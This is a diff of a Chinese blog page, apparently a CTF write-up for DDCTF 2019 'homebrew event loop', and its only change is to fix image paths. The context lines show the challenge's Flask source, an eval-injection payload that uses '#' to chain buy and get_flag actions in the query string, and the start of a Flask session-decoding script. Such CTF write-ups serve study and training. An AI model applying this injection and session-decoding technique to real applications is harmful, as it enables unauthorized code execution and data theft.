@@ -610,7 +610,7 @@ ap">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[flask|session解密]</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819150806086.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819150806086.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response
 <span class="token keyword">import</span> urllib
 
@@ -786,13 +786,13 @@ url_prefix <span class="token operator">=</span> <span class="token string">'/d5
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>大于5就可以拿到flag。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819152526783.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819152526783.png"></p>
 <p>在这，是先加num_items，再扣point，所以思路为：buy_handler执行n次-&gt;get_flag-&gt;再判断不合法。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819212251820.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819212251820.png"></p>
 <p>重点是在这里，可以执行任意代码</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205352012.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205352012.png"></p>
 <p>然后测试看看这个<code>get_mid_str()</code>有啥用</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205437078.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205437078.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
     <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
@@ -807,7 +807,7 @@ args <span class="token operator">=</span> get_mid_str<span class="token punctua
 <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>OUTPUT:</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205449579.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205449579.png"></p>
 <p>eval可以把拼接的字符串变成函数赋值给<code>event_handler</code></p>
 <p>而在eval里，后面有拼接字符串，该如何绕过呢？加个#即可。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -834,10 +834,10 @@ args&#x3D;[&#39;action:buy;2&#39;, &#39;action:buy;3&#39;, &#39;action:get_flag;
 <p>payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819214528531.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819214528531.png"></p>
 <p>flag已经写入到session里了，获取一下</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215500512.png"></p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215513386.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215500512.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215513386.png"></p>
 <h3 id="session解密"><a href="#session解密" class="headerlink" title="session解密"></a>session解密</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题</a></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
 <span class="token keyword">import</span> zlib
@@ -876,7 +876,7 @@ decryption<span class="token punctuation">(</span>s<span class="token punctuatio
 
 
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215404908.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215404908.png"></p>
 
                 
             </div>
